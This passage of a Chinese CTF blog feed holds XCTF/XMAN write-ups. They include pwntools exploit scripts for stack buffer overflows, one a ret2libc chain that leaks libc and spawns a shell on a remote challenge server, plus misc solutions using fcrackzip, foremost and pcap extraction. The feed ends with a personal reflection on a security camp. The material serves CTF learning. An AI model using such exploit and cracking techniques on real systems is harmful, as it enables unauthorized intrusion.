class="number">35516</span>)</span><br><span class="line"></span><br><span class="line">index=<span class="number">0</span></span><br><span class="line">num = <span class="string">'2 5 4 2 6 2 5 1 4 2 3 2 3 2 6 5 1 1 5 5 6 3 4 4 3 3 3 2 2 2 6 1 1 1 6 4 2 5 2 5 4 4 4 6 3 2 3 3 6 1'</span>.split()</span><br><span class="line">payload = <span class="number">0x40</span>*<span class="string">'a'</span>+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome, let me know your name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'Give me the point(1~6): '</span>)</span><br><span class="line">    p.sendline(num[index])</span><br><span class="line">    index=index+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;溢出点&quot;&gt;&lt;a href=&quot;#溢出点&quot; class=&quot;headerlink&quot; title=&quot;溢出点:&quot;&gt;&lt;/a&gt;溢出点:&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;spa
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>level3</title>
    <link href="http://yoursite.com/2019/08/15/XCTF-PWN/"/>
    <id>http://yoursite.com/2019/08/15/XCTF-PWN/</id>
    <published>2019-08-15T14:34:34.000Z</published>
    <updated>2019-08-20T15:39:20.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者<code>/bin/sh</code>字符串，考察的是libc泄露的基本操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input:\n"</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = cyclic(0x100)</span></span><br><span class="line">io = process(<span class="string">'./level3'</span>)</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45330</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048484</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x8c</span>*<span class="string">'a'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">'write:'</span>+hex(write))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>, write)</span><br><span class="line">system = write + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">"write"</span>)      <span class="comment">#system offset</span></span><br><span class="line">bin_sh = write + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">"write"</span>)   <span class="comment">#/bin/sh offset</span></span><br><span class="line">info(<span class="string">'system:'</span>+hex(system))</span><br><span class="line">info(<span class="string">'/bin/sh:'</span>+hex(bin_sh))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x8c</span>*<span class="string">'b'</span>+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>调试技巧:</strong></p><p>在read处按下<code>Tab</code>键找到地址</p><p>断点下在 <code>0x08048482</code> 处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br></pre></td></tr></table></figure><p>python里加上调试语句，python脚本运行时会自动打开<code>gdb</code>进行调试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb.attach(io)</span></span><br></pre></td></tr></table></figure><p>但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">io.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line"># pause()</span><br><span class="line">io.sendline(payload1)</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure><p>在填充至返回地址的时候，可以用<code>gdb</code>跟踪到ret指令处，此时查看<code>$esp</code>寄存器的内容，可以检查自己的地址是否填正确。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;level3&quot;&gt;&lt;a href=&quot;#level3&quot; class=&quot;headerlink&quot; title=&quot;level3&quot;&gt;&lt;/a&gt;level3&lt;/h2&gt;&lt;p&gt;漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者&lt;code&gt;/bin/sh&lt;/code&gt;字
      
    
    </summary>
    
    
      <category term="stack" scheme="http://yoursite.com/tags/stack/"/>
    
      <category term="xctf" scheme="http://yoursite.com/tags/xctf/"/>
    
  </entry>
  
  <entry>
    <title>xman-misc</title>
    <link href="http://yoursite.com/2019/08/12/xman-misc/"/>
    <id>http://yoursite.com/2019/08/12/xman-misc/</id>
    <published>2019-08-12T10:14:10.000Z</published>
    <updated>2019-08-20T15:35:52.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="cephalopod"><a href="#cephalopod" class="headerlink" title="cephalopod"></a>cephalopod</h2><p>题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://user-images.githubusercontent.com/42031559/62858792-de2a4180-bd2d-11e9-9e1b-de1a14c7cd32.png" alt="ceph1" title>                </div>                <div class="image-caption">ceph1</div>            </figure><p>追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://user-images.githubusercontent.com/42031559/62858798-e71b1300-bd2d-11e9-8ce1-dc3a0862ac22.png" alt="ceph2" title>                </div>                <div class="image-caption">ceph2</div>            </figure><p>linux下使用tcpxtract分离，其中一张图片即为flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap</span><br></pre></td></tr></table></figure><h2 id="Erik-Baleog-and-Olaf"><a href="#Erik-Baleog-and-Olaf" class="headerlink" title="Erik-Baleog-and-Olaf"></a>Erik-Baleog-and-Olaf</h2><p>压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare hint.png stego100.png -compose src diff.png</span><br></pre></td></tr></table></figure><p>hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可</p><h2 id="Miscellaneous-300"><a href="#Miscellaneous-300" class="headerlink" title="Miscellaneous-300"></a>Miscellaneous-300</h2><p>一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys,zipfile</span><br><span class="line">original_file=<span class="string">'12475.zip'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    original_file = zipfile.ZipFile(original_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'zip'</span> <span class="keyword">in</span> original_file.namelist()[<span class="number">0</span>]:</span><br><span class="line">        inner_zipfile = original_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        original_file_password = inner_zipfile[:inner_zipfile.find(<span class="string">'.'</span>)]</span><br><span class="line">        original_file.setpassword(original_file_password)</span><br><span class="line">        original_file.extractall()</span><br><span class="line">        os.remove(original_file.filename)</span><br><span class="line">        original_file = inner_zipfile</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>到最后一层12475.zip无法解压了，这个时候进行爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -l 1-6 -c 'a1' 12475.zip</span><br></pre></td></tr></table></figure><ul><li>-u：使用unzip解压</li><li>-l：后面接长度范围</li><li>-c：后接字符，a为所有小写字母，1是数字[0-9]</li></ul><h2 id="小小的PDF"><a href="#小小的PDF" class="headerlink" title="小小的PDF"></a>小小的PDF</h2><p>打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i 2333.pdf -o test</span><br></pre></td></tr></table></figure><p>foremost是基于文件头及尾部信息恢复文件的工具。</p><h2 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h2><ul><li><a href="https://chybeta.github.io/2017/08/25/流量包提取文件方法/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/</a></li><li><a href="https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf</a></li><li><a href="https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300" target="_blank" rel="noopener">https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;cephalopod&quot;&gt;&lt;a href=&quot;#cephalopod&quot; class=&quot;headerlink&quot; title=&quot;cephalopod&quot;&gt;&lt;/a&gt;cephalopod&lt;/h2&gt;&lt;p&gt;题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下
      
    
    </summary>
    
    
      <category term="xctf" scheme="http://yoursite.com/tags/xctf/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>XMAN-2019-福州营</title>
    <link href="http://yoursite.com/2019/08/11/xman/"/>
    <id>http://yoursite.com/2019/08/11/xman/</id>
    <published>2019-08-11T09:55:59.000Z</published>
    <updated>2019-08-12T03:06:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该是这样，因为太过符合心中的期待而感觉过于自然，我知道这是因为夏令营把所有爱好安全的人都聚集到一起了，身边都是志同道合的人这是一件很难得的事，在这里学习的9天时间，我感受到和别人的差距。很奇怪，我并没有向学校里绩点比人低那样焦虑，我想的只是我要怎么弥补自己的基础知识，要怎么向大佬请教，要怎么搞懂这道题。大佬们很强，有名校学长带着入门的；有自己摸索刷题999+的，看到有这么多人和我一样真正的在搞这个东西，想到自己玩的这么浮躁，还把理由归于方向以至于这么就都只是菜鸟，不禁觉得惭愧。想要变强除了做题、看书、总结没有别的途径，你不会证明基础知识不够牢固，那就继续学，而不是怀疑和放弃。不过一个做总是避免不了成为井底之蛙，你不知道外面的世界，也不知道自己的水平，更不知道自己学得怎么样，这次出来真的是让我见了市面，也明白了要端正学习态度，不能有畏难情绪，希望自己能在这条路上坚持下去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;该从何说起呢，我记得大一的寒假和中国农大的同学一起参观了北京的几所高校，那个时候自己惊叹于别人“大学之楼大”，确从未曾接触过那些优秀高校的学生，心里暗自羡慕，说以后也要去那种学校读书。而这次在夏令营，我每天做题、往返于福大教学区和生活区之间，我内心并无太多波动，仿佛大学就该
      
    
    </summary>
    
    
  </entry>
  
</feed>
